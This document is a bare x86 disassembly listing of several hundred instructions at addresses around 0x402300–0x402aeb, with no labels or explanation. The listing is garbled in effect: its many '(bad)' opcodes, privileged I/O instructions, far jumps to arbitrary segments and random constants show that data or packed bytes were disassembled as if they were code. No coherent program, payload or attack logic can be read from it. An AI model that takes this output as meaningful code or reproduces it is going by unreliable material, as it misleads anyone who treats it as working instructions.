  40230a:	int3   
  40230b:	repz adc BYTE PTR [edx+0x1bce6d47],bl
  402312:	ins    BYTE PTR es:[edi],dx
  402313:	ins    BYTE PTR es:[edi],dx
  402314:	dec    ebp
  402315:	lahf   
  402316:	test   al,0xa0
  402318:	stos   BYTE PTR es:[edi],al
  402319:	les    edx,FWORD PTR [ecx]
  40231b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40231c:	pop    ds
  40231d:	dec    eax
  40231e:	push   ecx
  40231f:	mov    ah,0xdf
  402321:	sar    DWORD PTR [ebx-0x6245d929],0x90
  402328:	mov    eax,0xdde94845
  40232d:	scas   al,BYTE PTR es:[edi]
  40232e:	mov    DWORD PTR [esi],ecx
  402330:	cmp    dh,BYTE PTR [ecx]
  402332:	pop    ss
  402333:	ret    
  402334:	mov    edx,0x910a2f54
  402339:	stc    
  40233a:	je     0x4023b7
  40233c:	add    BYTE PTR ds:[ebp+0x1a1b00fb],al
  402343:	and    ebp,ebp
  402345:	xchg   ecx,eax
  402346:	fldenv [eax+0x73395f0a]
  40234c:	pop    es
  40234d:	int3   
  40234e:	add    eax,0x733b43f8
  402353:	mov    fs,WORD PTR ds:0x9d6780e1
  402359:	out    dx,al
  40235a:	shl    BYTE PTR [edi],0xcf
  40235d:	stos   BYTE PTR es:[edi],al
  40235e:	clts   
  402360:	mov    dl,0x45
  402362:	(bad)  
  402364:	rcr    BYTE PTR [edi+0x56],cl
  402367:	mov    esp,?
  402369:	in     al,dx
  40236a:	fidiv  DWORD PTR [ebx-0xf8e1a3]
  402370:	pop    ss
  402371:	dec    esi
  402372:	arpl   ax,ax
  402374:	ror    DWORD PTR [ecx],0x89
  402377:	scas   al,BYTE PTR es:[edi]
  402378:	scas   al,BYTE PTR es:[edi]
  402379:	out    dx,eax
  40237a:	cld    
  40237b:	xor    BYTE PTR [ecx+0x7d670b24],bh
  402381:	cld    
  402382:	stos   DWORD PTR es:[edi],eax
  402383:	mov    cl,0xc
  402385:	std    
  402386:	mov    al,0x60
  402388:	pop    DWORD PTR [eax+0x1aada08f]
  40238e:	xor    ecx,esi
  402390:	adc    ah,BYTE PTR [edi]
  402392:	lea    edx,[edx+0x478eff42]
  402398:	xor    DWORD PTR [edx-0x4203dfb],ebp
  40239e:	sahf   
  40239f:	loope  0x402389
  4023a1:	sbb    DWORD PTR [edi+0x76f96330],esp
  4023a7:	test   BYTE PTR [edx-0x32],bl
  4023aa:	xor    ebp,DWORD PTR [esi]
  4023ac:	mov    dl,0xb8
  4023ae:	inc    eax
  4023af:	inc    ecx
  4023b0:	pusha  
  4023b1:	sub    eax,DWORD PTR [esp+eiz*4]
  4023b4:	test   al,0x46
  4023b6:	cmp    eax,0x87ab57ac
  4023bb:	xor    BYTE PTR [ebp+0x625ad33d],0x3b
  4023c2:	in     eax,dx
  4023c3:	and    DWORD PTR [ebx-0xd],esp
  4023c6:	hlt    
  4023c7:	fcmovne st,st(2)
  4023c9:	and    bl,cl
  4023cb:	arpl   WORD PTR gs:[ecx+edi*2+0x6f8a1b5a],si
  4023d3:	lea    esp,[esi]
  4023d5:	(bad)  
  4023d6:	or     eax,0x2fc25209
  4023db:	test   al,0x2c
  4023dd:	call   DWORD PTR [esi+0x5d]
  4023e0:	les    edx,FWORD PTR [ecx-0x7b]
  4023e3:	push   ebp
  4023e4:	mul    BYTE PTR [edi-0x3d]
  4023e7:	sbb    al,0x5d
  4023e9:	sbb    DWORD PTR [edx+ecx*1],esi
  4023ec:	pop    ss
  4023ed:	(bad)  
  4023ee:	hlt    
  4023ef:	loope  0x4023ca
  4023f1:	scas   al,BYTE PTR es:[edi]
  4023f2:	sbb    DWORD PTR [eax-0x44],0x75610d60
  4023f9:	mov    ebx,DWORD PTR [eax-0x3fe0a402]
  4023ff:	add    al,ch
  402401:	add    BYTE PTR [eax],bl
  402403:	pop    ebp
  402404:	sbb    esi,DWORD PTR [esi]
  402406:	sbb    ch,BYTE PTR [ecx-0x2f01f6bd]
  40240c:	push   ecx
  40240d:	push   eax
  40240e:	aas    
  40240f:	xor    DWORD PTR [ebx-0x21],esp
  402412:	ret    0xc18f
  402415:	xchg   ebp,eax
  402416:	jp     0x4023f4
  402418:	inc    ebp
  402419:	not    BYTE PTR [edx]
  40241b:	inc    ebx
  40241c:	repz inc edi
  40241e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40241f:	out    0xc1,eax
  402421:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402422:	aaa    
  402423:	pop    edx
  402424:	sbb    BYTE PTR [ebx+0x717dc98b],ah
  40242a:	outs   dx,DWORD PTR ds:[esi]
  40242b:	mov    eax,0x5d3125a3
  402430:	ja     0x40245a
  402432:	nop
  402433:	mov    ebp,0x4e1d7ada
  402438:	fimul  DWORD PTR [ecx-0xb9d70e9]
  40243e:	lods   al,BYTE PTR ds:[esi]
  40243f:	addr16 je 0x4023da
  402442:	push   edi
  402443:	or     ebx,DWORD PTR [ebx]
  402445:	dec    eax
  402446:	mov    esi,DWORD PTR [eax-0x13]
  402449:	rol    BYTE PTR [ebx],cl
  40244b:	mov    bh,0xc5
  40244d:	loop   0x402424
  40244f:	jp     0x402406
  402451:	jbe    0x402491
  402453:	leave  
  402454:	arpl   WORD PTR [ecx],bp
  402456:	aaa    
  402457:	pop    ecx
  402458:	and    edx,DWORD PTR [ebx]
  40245a:	scas   al,BYTE PTR es:[edi]
  40245b:	push   edx
  40245c:	cmp    bh,BYTE PTR [edx+0x57c87b63]
  402462:	cs popa 
  402464:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402465:	adc    edx,DWORD PTR [edx]
  402467:	add    BYTE PTR [ebx-0x4],al
  40246a:	mov    ds:0xf2cb9510,eax
  40246f:	outs   dx,BYTE PTR ds:[esi]
  402470:	mov    ds:0xb05c2d1d,eax
  402475:	icebp  
  402476:	sub    BYTE PTR [esi+0x5c648b6],0xea
  40247d:	ds inc edi
  40247f:	leave  
  402480:	pop    edi
  402481:	ret    0xf85b
  402484:	push   esp
  402485:	mov    ch,0x6d
  402487:	test   al,0x81
  402489:	adc    al,0x5b
  40248b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40248c:	aaa    
  40248d:	in     eax,dx
  40248e:	loope  0x4024c0
  402490:	ss mov ebp,0xfcf8f0e8
  402496:	je     0x40244d
  402498:	and    BYTE PTR [ebp+0x7fd107ff],bh
  40249e:	and    al,0x55
  4024a0:	test   eax,0x9a84f5
  4024a5:	sub    dl,cl
  4024a7:	or     DWORD PTR [esi+0x62],ebp
  4024aa:	test   al,0x4a
  4024ac:	dec    ebx
  4024ad:	test   BYTE PTR [edx+esi*8],bl
  4024b0:	pop    esp
  4024b1:	scas   eax,DWORD PTR es:[edi]
  4024b2:	xchg   ecx,eax
  4024b3:	jne    0x4024b4
  4024b5:	lods   eax,DWORD PTR ds:[esi]
  4024b6:	lds    ecx,FWORD PTR [esi+0x629a4241]
  4024bc:	or     DWORD PTR [ebx+0x66],ecx
  4024bf:	repz clc 
  4024c1:	sub    edx,ebp
  4024c3:	adc    ebx,DWORD PTR [edi-0x37]
  4024c6:	xor    BYTE PTR [esi-0x187b85b5],0x37
  4024cd:	mov    WORD PTR [ebp-0x6],?
  4024d0:	int3   
  4024d1:	rcl    DWORD PTR [edi+0x3136add4],1
  4024d7:	(bad)  
  4024d8:	cmp    BYTE PTR [esp+ecx*1],dl
  4024db:	adc    eax,0x27dd5f8f
  4024e0:	outs   dx,DWORD PTR ds:[esi]
  4024e1:	lahf   
  4024e2:	test   DWORD PTR ds:0x4b9439f7,ebx
  4024e8:	mov    bh,0x38
  4024ea:	(bad)  
  4024eb:	adc    BYTE PTR [eax+ecx*1],dl
  4024ee:	adc    edi,ecx
  4024f0:	movups xmm6,XMMWORD PTR [esi]
  4024f3:	adc    esp,DWORD PTR [edi-0x3f778c5c]
  4024f9:	test   al,0xef
  4024fb:	lahf   
  4024fc:	or     ch,BYTE PTR [ecx-0x4b8dedc2]
  402502:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402503:	mov    cl,0x2b
  402505:	mov    esi,0x36265e3
  40250a:	mov    esi,0x70c1787
  40250f:	push   es
  402510:	popa   
  402511:	fdiv   DWORD PTR ds:0xfa28eda0
  402517:	jmp    0xf13b:0x2310fae0
  40251e:	add    al,0x16
  402520:	push   ecx
  402521:	out    0x53,eax
  402523:	inc    ebp
  402524:	test   al,0x23
  402526:	add    dh,BYTE PTR [esi+0x267c22ad]
  40252c:	test   eax,0xa452eac
  402531:	push   0xdd824cb6
  402536:	sub    al,0x82
  402538:	jae    0x40255d
  40253a:	jbe    0x4024f3
  40253c:	fistp  DWORD PTR [edi+ebx*1+0x32]
  402540:	sbb    DWORD PTR [esi+edx*8],ebp
  402543:	xchg   ebp,eax
  402544:	sub    ecx,esp
  402546:	xor    eax,0x13420e0f
  40254b:	test   al,0xf0
  40254d:	jnp    0x402523
  40254f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402550:	mov    ds:0xd3091af,eax
  402555:	sbb    edx,DWORD PTR [edx-0x7fcfeb2c]
  40255b:	and    al,BYTE PTR [ebx]
  40255d:	test   DWORD PTR [eax-0x7237f250],eax
  402563:	or     al,0x6
  402565:	(bad)  
  402566:	jmp    0x402569
  402568:	pop    esi
  402569:	in     eax,0x9b
  40256b:	push   eax
  40256c:	xor    DWORD PTR [ebx+0x79],ebx
  40256f:	sar    BYTE PTR [ebp+0x2d],0x6d
  402573:	inc    esi
  402574:	es js  0x402547
  402577:	xor    eax,0x81b51527
  40257c:	fimul  WORD PTR [ecx+0xc]
  40257f:	leave  
  402580:	shl    DWORD PTR [edx+0x8],cl
  402583:	imul   esp,DWORD PTR [ebx],0x3f8abf02
  402589:	sub    al,0x9a
  40258b:	std    
  40258c:	outs   dx,DWORD PTR ds:[esi]
  40258d:	jecxz  0x402556
  40258f:	and    dl,ch
  402591:	jnp    0x402587
  402593:	pop    edi
  402594:	push   esp
  402595:	xor    ebp,DWORD PTR [ecx]
  402597:	xchg   edi,eax
  402598:	sub    eax,0xb932ae16
  40259d:	daa    
  40259e:	pop    esi
  40259f:	loop   0x4025ad
  4025a1:	mov    eax,0xb2d15378
  4025a6:	mov    eax,ds:0xf6324440
  4025ab:	adc    al,0x85
  4025ad:	xchg   ah,bl
  4025af:	xchg   BYTE PTR [eax-0x187b2661],ch
  4025b5:	jae    0x4025d3
  4025b7:	pop    es
  4025b8:	xchg   ebp,eax
  4025b9:	push   0xf1b1069c
  4025be:	dec    esi
  4025bf:	aam    0xaa
  4025c1:	xchg   edi,eax
  4025c2:	loope  0x4025c6
  4025c4:	pop    ebp
  4025c5:	in     al,0xf4
  4025c7:	cli    
  4025c8:	ins    BYTE PTR es:[edi],dx
  4025c9:	pop    ecx
  4025ca:	repnz nop
  4025cc:	pop    edi
  4025cd:	icebp  
  4025ce:	sbb    BYTE PTR [eax],ch
  4025d0:	jl     0x40264a
  4025d2:	push   ss
  4025d3:	pushf  
  4025d4:	xor    DWORD PTR [ecx-0x2d892344],ecx
  4025da:	and    al,0x59
  4025dc:	out    dx,eax
  4025dd:	jnp    0x402595
  4025df:	repnz test eax,eax
  4025e2:	xchg   BYTE PTR [edx],bl
  4025e4:	and    eax,0xd136ecd8
  4025e9:	cmp    BYTE PTR [ebx-0x2487f96e],ah
  4025ef:	sbb    BYTE PTR [edx+edx*8+0x570fced],0xb6
  4025f7:	imul   DWORD PTR [esi]
  4025f9:	mov    bl,0xd9
  4025fb:	lock inc ecx
  4025fd:	or     al,0xca
  4025ff:	dec    eax
  402600:	xor    al,BYTE PTR ds:0xc84c537a
  402606:	rol    BYTE PTR [ecx+esi*8+0x2024c90a],cl
  40260d:	nop
  40260e:	adc    esp,edx
  402610:	std    
  402611:	xchg   edx,eax
  402612:	shr    WORD PTR [ebx],0xae
  402616:	or     esp,DWORD PTR ds:0x839d07ce
  40261c:	cmp    ecx,esi
  40261e:	mov    al,0x3
  402620:	mov    gs,WORD PTR [ecx+edx*1-0x26]
  402624:	sbb    bl,al
  402626:	push   ebx
  402627:	or     esi,DWORD PTR [ebp-0x26520eb]
  40262d:	mov    ds:0x3a4141c9,al
  402632:	mov    cl,0x78
  402634:	sub    al,0x38
  402636:	push   esp
  402637:	std    
  402638:	dec    edi
  402639:	loope  0x402653
  40263b:	out    dx,al
  40263c:	shl    BYTE PTR [esi+0x38],cl
  40263f:	(bad)  
  402640:	dec    eax
  402641:	pop    es
  402642:	lods   al,BYTE PTR ds:[esi]
  402643:	jg     0x4026b2
  402645:	imul   ecx,DWORD PTR [edx+0x43668df3],0xb7b2d1b6
  40264f:	xchg   edi,eax
  402650:	jnp    0x4026c3
  402652:	test   al,0x8f
  402654:	scas   al,BYTE PTR es:[edi]
  402655:	jns    0x4026b7
  402657:	inc    ecx
  402658:	or     BYTE PTR [esi],ch
  40265a:	call   0x33f738bb
  40265f:	idiv   cl
  402661:	inc    esp
  402662:	lea    edx,[edi-0x33e3b7f5]
  402668:	loope  0x4026b5
  40266a:	fimul  DWORD PTR [ecx+ecx*8+0xd]
  40266e:	sbb    eax,0x79b9c8a7
  402673:	fild   WORD PTR [eax+edx*8]
  402676:	(bad)  
  402677:	mov    ds:0x7b6096ee,al
  40267c:	dec    ebx
  40267d:	mov    DWORD PTR [esi+0x13],ebp
  402680:	retf   0x38b4
  402683:	adc    BYTE PTR [ebp-0x19d48f7e],dl
  402689:	stc    
  40268a:	sub    eax,0x450d4af8
  40268f:	int3   
  402690:	xlat   BYTE PTR ds:[ebx]
  402691:	sbb    eax,0x2611c5b0
  402696:	lahf   
  402697:	pop    edx
  402698:	sbb    bh,dl
  40269a:	sub    BYTE PTR [ebx+0x185866b3],ah
  4026a0:	(bad)  
  4026a1:	jae    0x4026f8
  4026a3:	mov    al,0x42
  4026a5:	lods   al,BYTE PTR ds:[esi]
  4026a6:	nop
  4026a7:	in     eax,0x55
  4026a9:	fadd   st(2),st
  4026ab:	cli    
  4026ac:	mov    edi,0x16cd354c
  4026b1:	jmp    0x4026a7
  4026b3:	cwde   
  4026b4:	mov    eax,ds:0xdff7253
  4026b9:	xor    DWORD PTR [edx-0x2b],ebp
  4026bc:	into   
  4026bd:	fwait
  4026be:	mov    ebp,0xe6baaa9d
  4026c3:	in     al,dx
  4026c4:	rcr    BYTE PTR [edi-0x66],1
  4026c7:	ret    0x6fdc
  4026ca:	inc    edi
  4026cb:	daa    
  4026cc:	and    DWORD PTR [edi],0x54a5984c
  4026d2:	sbb    DWORD PTR [esi-0x59],edi
  4026d5:	jmp    0x487a:0xd465aa71
  4026dc:	xor    BYTE PTR [edx-0x5953b693],dl
  4026e2:	inc    ebx
  4026e3:	dec    ebx
  4026e4:	push   ecx
  4026e5:	mov    eax,ds:0x47340380
  4026ea:	jmp    0xbe06:0x6424c271
  4026f1:	pop    ebx
  4026f2:	dec    edx
  4026f3:	lods   eax,DWORD PTR ds:[esi]
  4026f4:	xor    ebx,DWORD PTR [ebx-0x4f4ea4bc]
  4026fa:	mul    DWORD PTR [edx]
  4026fc:	xor    DWORD PTR [ecx+0x22c0557e],esi
  402702:	iret   
  402703:	pop    ecx
  402704:	(bad)  
  402705:	jle    0x4026cc
  402707:	inc    ah
  402709:	test   eax,0x79f22a7b
  40270e:	in     eax,dx
  40270f:	rcr    ah,cl
  402711:	js     0x402721
  402713:	ds std 
  402715:	push   0x61c145b1
  40271a:	ret    
  40271b:	clc    
  40271c:	in     eax,0x71
  40271e:	rcl    DWORD PTR [esi],1
  402720:	pushf  
  402721:	jno    0x402740
  402723:	push   es
  402724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402725:	and    DWORD PTR [esi+0xd],ecx
  402728:	jae    0x402736
  40272a:	jl     0x4026b0
  40272c:	jp     0x402707
  40272e:	fcomp  QWORD PTR [ecx+0x2ab99ef2]
  402734:	mov    edi,0x6bc489bd
  402739:	inc    ebp
  40273a:	call   0xf471:0xbc915951
  402741:	push   ds
  402742:	sahf   
  402743:	push   0x79
  402745:	cmp    esp,DWORD PTR [ebx+ebx*8+0x665559ca]
  40274c:	aas    
  40274d:	loop   0x402773
  40274f:	inc    esp
  402750:	cmp    esi,0x3032e9e0
  402756:	in     al,0x42
  402758:	out    0x33,eax
  40275a:	xchg   edi,eax
  40275b:	bound  edx,QWORD PTR [edi-0x2fc2fa9a]
  402761:	push   0x66743760
  402766:	fs or  ebx,DWORD PTR ss:[esi]
  40276a:	jl     0x4026fc
  40276c:	inc    eax
  40276d:	mov    al,0xfa
  40276f:	or     eax,0xe287ed1
  402774:	aad    0xa7
  402776:	jecxz  0x402700
  402778:	push   ebx
  402779:	cdq    
  40277a:	mov    cl,0xe1
  40277c:	inc    edx
  40277d:	inc    esi
  40277e:	sbb    BYTE PTR [edi-0x2ea7e12d],0x3e
  402785:	daa    
  402786:	fidivr WORD PTR [edi+0x10031689]
  40278c:	mov    cl,0x8b
  40278e:	ins    DWORD PTR es:[edi],dx
  40278f:	jb     0x4027cc
  402791:	(bad)  
  402792:	shr    bl,1
  402794:	push   ecx
  402795:	jp     0x402783
  402797:	outs   dx,DWORD PTR ds:[esi]
  402798:	lock mov eax,0xf4fdbba3
  40279e:	mov    ebx,0x219d3c99
  4027a3:	mov    bh,0xac
  4027a5:	cwde   
  4027a6:	mov    edi,0xa7da8000
  4027ab:	es in  al,dx
  4027ad:	cmp    bh,ch
  4027af:	pop    edx
  4027b0:	jp     0x4027b0
  4027b2:	and    edx,DWORD PTR [ebx+0x70]
  4027b5:	hlt    
  4027b6:	sub    dh,bl
  4027b8:	and    dl,al
  4027ba:	jge    0x40276f
  4027bc:	adc    al,0x2c
  4027be:	es mov edi,0xb3727f5d
  4027c4:	arpl   bx,sp
  4027c6:	push   0x4c
  4027c8:	fstp   TBYTE PTR ds:0x9bb8e1bb
  4027ce:	xchg   ecx,eax
  4027cf:	sar    DWORD PTR [esi-0x70],1
  4027d2:	and    eax,0xafe059c3
  4027d7:	icebp  
  4027d8:	pcmpeqb mm5,mm0
  4027db:	mov    edx,0x80817309
  4027e0:	call   FWORD PTR [edx]
  4027e2:	fimul  WORD PTR [ecx+ebx*4+0x4f]
  4027e6:	jg     0x4027d4
  4027e8:	shl    esp,1
  4027ea:	jle    0x40281e
  4027ec:	cs out dx,eax
  4027ee:	adc    ch,bh
  4027f0:	sub    DWORD PTR [esi-0x4f],ecx
  4027f3:	cdq    
  4027f4:	mov    bh,0x2e
  4027f6:	push   ds
  4027f7:	jle    0x40279e
  4027f9:	adc    ebx,edx
  4027fb:	jg     0x402830
  4027fd:	mov    WORD PTR [ebx],?
  4027ff:	dec    esp
  402800:	shufps xmm6,XMMWORD PTR [eax+0x63],0xc0
  402805:	daa    
  402806:	jb     0x402885
  402808:	cli    
  402809:	imul   edi,DWORD PTR [edi],0x6c21b97c
  40280f:	cli    
  402810:	(bad)  
  402812:	addr16 (bad) 
  402814:	clc    
  402815:	lods   al,BYTE PTR ds:[esi]
  402816:	xchg   esp,eax
  402817:	sbb    ah,BYTE PTR [edi-0x3]
  40281a:	pop    ds
  40281b:	mov    ecx,0xe5ce6b61
  402820:	les    edi,FWORD PTR [edx]
  402822:	push   eax
  402823:	outs   dx,BYTE PTR ds:[esi]
  402824:	(bad)  
  402825:	dec    esp
  402826:	lods   al,BYTE PTR ds:[esi]
  402827:	inc    esp
  402828:	push   cs
  402829:	popa   
  40282a:	or     edx,DWORD PTR [edx-0xe22bb23]
  402830:	adc    al,0xe6
  402832:	adc    al,0x51
  402834:	add    al,0x4
  402836:	push   edi
  402837:	lock lock rol esi,1
  40283b:	fbstp  TBYTE PTR fs:[eax+ecx*4]
  40283f:	xor    eax,0x1b000fd9
  402844:	aam    0x35
  402846:	fsubr  st(6),st
  402848:	das    
  402849:	imul   edi,DWORD PTR [ecx],0xffffff81
  40284c:	xchg   ecx,eax
  40284d:	scas   eax,DWORD PTR es:[edi]
  40284e:	(bad)  
  40284f:	jmp    0x9eda:0x57728687
  402856:	push   esi
  402857:	adc    al,0x13
  402859:	out    0xb4,eax
  40285b:	pop    edi
  40285c:	retf   0xffe0
  40285f:	pop    ebp
  402860:	cmp    eax,0xc147341f
  402865:	into   
  402866:	lahf   
  402867:	mov    WORD PTR [ecx-0x80],cx
  40286b:	xchg   esi,eax
  40286c:	in     al,dx
  40286d:	pop    eax
  40286e:	lods   eax,DWORD PTR ds:[si]
  402870:	cmp    al,0x22
  402872:	scas   eax,DWORD PTR es:[edi]
  402873:	mov    dl,0x52
  402875:	daa    
  402876:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402878:	mov    WORD PTR [eax+0x6001537c],?
  40287e:	pop    esi
  40287f:	mov    eax,ds:0x94373616
  402884:	mov    bh,0x33
  402886:	and    ebp,ebx
  402888:	daa    
  402889:	jp     0x4028b4
  40288b:	add    DWORD PTR [bx-0x631f],esp
  402890:	push   eax
  402891:	dec    esp
  402892:	jb     0x4028fa
  402894:	sbb    BYTE PTR [ebp+0x6414817],al
  40289a:	jp     0x402879
  40289c:	sub    ecx,esp
  40289e:	add    bl,bl
  4028a0:	popa   
  4028a1:	sub    al,ah
  4028a3:	test   DWORD PTR [ecx+0x55],ebx
  4028a6:	bound  edx,QWORD PTR [eax]
  4028a8:	mov    ecx,DWORD PTR [ecx-0x47]
  4028ab:	call   0x6a2ebfc8
  4028b0:	lods   eax,DWORD PTR ds:[esi]
  4028b1:	fimul  WORD PTR [edx+eax*1+0x4cc502a3]
  4028b8:	and    ecx,DWORD PTR [ecx+0x71e8139b]
  4028be:	pop    esp
  4028bf:	stos   BYTE PTR es:[edi],al
  4028c0:	pop    ebp
  4028c1:	fwait
  4028c2:	ins    DWORD PTR es:[edi],dx
  4028c3:	adc    dl,al
  4028c5:	pop    ebp
  4028c6:	pop    ebx
  4028c7:	add    BYTE PTR [esi+0x2e7ee787],0x65
  4028ce:	pushf  
  4028cf:	sar    dh,1
  4028d1:	pushf  
  4028d2:	rcl    al,0xc5
  4028d5:	xchg   edi,eax
  4028d6:	sub    bl,bh
  4028d8:	add    ah,BYTE PTR ds:0x8883aaf3
  4028de:	cwde   
  4028df:	arpl   WORD PTR [esi],bp
  4028e1:	pushf  
  4028e2:	jb     0x4028ac
  4028e4:	jno    0x4028e0
  4028e6:	mov    ds:0x2fc9cf8e,al
  4028eb:	pop    edx
  4028ec:	es jmp 0xbee25851
  4028f2:	call   DWORD PTR [esi-0x16c27389]
  4028f8:	ja     0x402905
  4028fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028fb:	jmp    0x9982:0x6fe01069
  402902:	outs   dx,DWORD PTR ds:[esi]
  402903:	adc    esi,DWORD PTR [esi-0x42c5d999]
  402909:	clc    
  40290a:	push   esp
  40290b:	push   eax
  40290c:	mov    ebx,0x7109b351
  402911:	add    al,0xab
  402913:	test   DWORD PTR [eax-0x7b],ebp
  402916:	and    al,0xce
  402918:	pop    ds
  402919:	mov    ch,0x47
  40291b:	pop    ebp
  40291c:	pop    edi
  40291d:	cmp    eax,ebx
  40291f:	xchg   ebp,eax
  402920:	pop    ebx
  402921:	aad    0x3c
  402923:	loopne 0x4028b3
  402925:	dec    eax
  402926:	mov    esp,0x5fbabcd0
  40292b:	pop    edi
  40292c:	addr16 or eax,0x77e2b46c
  402932:	pmuludq mm3,QWORD PTR [ebx-0x41e47dd4]
  402939:	cld    
  40293a:	cmp    eax,0xd1770d12
  40293f:	mov    edi,DWORD PTR [eax]
  402941:	les    ebp,FWORD PTR [ebx+0x7]
  402944:	dec    ebp
  402945:	add    DWORD PTR [ebp-0x1d7d1aed],0x47
  40294c:	sti    
  40294d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40294e:	pop    es
  40294f:	push   0x68c1658e
  402954:	dec    di
  402956:	or     DWORD PTR [esi+0x4b],0x6a3fa84b
  40295d:	cmp    bh,ch
  40295f:	inc    ebx
  402960:	push   ds
  402961:	sbb    edi,0x21
  402964:	sbb    DWORD PTR [esi+eiz*2],eax
  402967:	int3   
  402968:	mov    ch,0x33
  40296a:	xchg   esi,eax
  40296b:	aad    0xe8
  40296d:	sbb    al,0x6b
  40296f:	pusha  
  402970:	xor    ebx,esp
  402972:	or     esi,DWORD PTR [edi-0x59]
  402975:	inc    edx
  402976:	pop    eax
  402977:	int3   
  402978:	addr16 mov bh,0xa5
  40297b:	mov    esi,0xfdfd7e0d
  402980:	lods   al,BYTE PTR ds:[esi]
  402981:	mov    bh,0x8b
  402983:	mov    dh,0xe8
  402985:	fst    QWORD PTR [edx]
  402987:	out    dx,eax
  402988:	add    al,al
  40298a:	fisub  WORD PTR [ebp-0x34]
  40298d:	std    
  40298e:	jmp    0xd39e:0x386c2e16
  402995:	mov    ds:0x1efd21b4,al
  40299a:	and    eax,0x48154f22
  40299f:	js     0x402982
  4029a1:	mov    al,0xb4
  4029a3:	test   BYTE PTR [esi-0x10],al
  4029a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029a7:	inc    ebp
  4029a8:	neg    edi
  4029aa:	pop    ds
  4029ab:	adc    ebp,0xffffffcc
  4029ae:	out    0x28,eax
  4029b0:	dec    esi
  4029b1:	mov    esi,0x17ceafec
  4029b6:	pop    ds
  4029b7:	ret    0xed9d
  4029ba:	mov    BYTE PTR [esi+edx*1+0x3f244c54],bl
  4029c1:	hlt    
  4029c2:	and    BYTE PTR [edx+0x29f79084],cl
  4029c8:	mov    ecx,0x35fce40
  4029cd:	mov    DWORD PTR [ebp-0x4a],ebx
  4029d0:	cmp    BYTE PTR [eax+0x5e],bl
  4029d3:	test   eax,0x78ab71bc
  4029d8:	mov    edx,0x1b2868c5
  4029dd:	push   es
  4029de:	sahf   
  4029df:	call   DWORD PTR [ecx-0x1c1cd62e]
  4029e5:	fbld   TBYTE PTR [ebp-0x10433da7]
  4029eb:	les    edx,FWORD PTR [ebp-0x49]
  4029ee:	call   0xb64e7117
  4029f3:	push   0x4870e00a
  4029f8:	mov    dl,0x7b
  4029fa:	push   eax
  4029fb:	and    ebx,DWORD PTR [eax+0x7e0f76eb]
  402a01:	xchg   dh,bl
  402a03:	test   eax,0x9e50dc3a
  402a08:	hlt    
  402a09:	mov    bl,0xc3
  402a0b:	jge    0x40298f
  402a0d:	and    al,BYTE PTR [edi+0x69]
  402a10:	(bad)  
  402a11:	cmp    edx,ebp
  402a13:	cmp    al,0x63
  402a15:	shl    BYTE PTR [esi+edi*4+0x73],0x4
  402a1a:	fisub  DWORD PTR [eax+ebp*1]
  402a1d:	add    dh,0x80
  402a20:	xchg   edi,eax
  402a21:	xchg   ebx,eax
  402a22:	in     al,0xf8
  402a24:	popf   
  402a25:	mov    cl,0xf2
  402a27:	mov    WORD PTR [edx+eax*1+0x3a],cs
  402a2b:	mov    ebx,0xf3caf8fd
  402a30:	mov    ecx,0xe3888334
  402a35:	lahf   
  402a36:	xlat   BYTE PTR ds:[ebx]
  402a37:	loope  0x402a15
  402a39:	aam    0x94
  402a3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a3c:	push   ebx
  402a3d:	in     al,dx
  402a3e:	add    eax,0x68b593a9
  402a43:	sti    
  402a44:	push   dx
  402a46:	ret    
  402a47:	clc    
  402a48:	scas   al,BYTE PTR es:[edi]
  402a49:	or     eax,0xd599cf21
  402a4e:	jge    0x402a74
  402a50:	add    BYTE PTR [eax-0x8],0xb3
  402a54:	fldenv [esi+ebp*8]
  402a57:	jne    0x402ac0
  402a59:	mov    ds:0xa808eae9,eax
  402a5e:	mov    bh,0x9f
  402a60:	adc    al,0xd5
  402a62:	or     ebp,DWORD PTR [ecx+0x73]
  402a65:	push   es
  402a66:	jae    0x402a95
  402a68:	icebp  
  402a69:	fdiv   QWORD PTR [eax+0x3e]
  402a6c:	and    al,BYTE PTR [ecx-0x73]
  402a6f:	(bad)  
  402a70:	in     eax,dx
  402a71:	pop    ebx
  402a72:	xchg   ecx,eax
  402a73:	sub    esi,DWORD PTR [edx+0x3bd031c1]
  402a79:	nop
  402a7a:	sti    
  402a7b:	ss push 0x454260d0
  402a81:	pop    edx
  402a82:	cmc    
  402a83:	(bad)  
  402a84:	cli    
  402a85:	enter  0xa983,0x32
  402a89:	loope  0x402a13
  402a8b:	mov    esp,0xdef16f41
  402a90:	mov    ecx,0x98defa79
  402a95:	fisubr DWORD PTR es:[edx-0x253ed24b]
  402a9c:	lods   al,BYTE PTR ds:[esi]
  402a9d:	dec    eax
  402a9e:	(bad)
  402aa3:	sub    ch,BYTE PTR [eax-0x69]
  402aa6:	ret    0x9c6
  402aa9:	rol    DWORD PTR [edx+0x4d],0xcf
  402aad:	pop    ebx
  402aae:	mov    esi,0xb761c41c
  402ab3:	add    eax,0xc0680805
  402ab8:	sti    
  402ab9:	and    DWORD PTR [ebx+0x23],ebx
  402abc:	je     0x402ad1
  402abe:	push   ebx
  402abf:	lock jmp 0x402b12
  402ac2:	xchg   esp,ebx
  402ac4:	add    BYTE PTR [edx+edx*4-0x80],cl
  402ac8:	(bad)  
  402ac9:	cmp    ah,dl
  402acb:	sbb    eax,0x21b63f8
  402ad0:	pop    ds
  402ad1:	pop    dx
  402ad3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ad4:	pop    eax
  402ad5:	(bad)  [edx+0x53]
  402ad8:	sahf   
  402ad9:	fcmovnu st,st(2)
  402adb:	dec    ebx
  402adc:	xchg   BYTE PTR [esi-0x22a8b417],al
  402ae2:	mov    ch,ah
  402ae4:	in     eax,dx
  402ae5:	mov    ecx,DWORD PTR [ebp+0x31c0caad]
  402aeb:	data16 cmp BYTE PTR ds:[ecx+0x38958adc],al
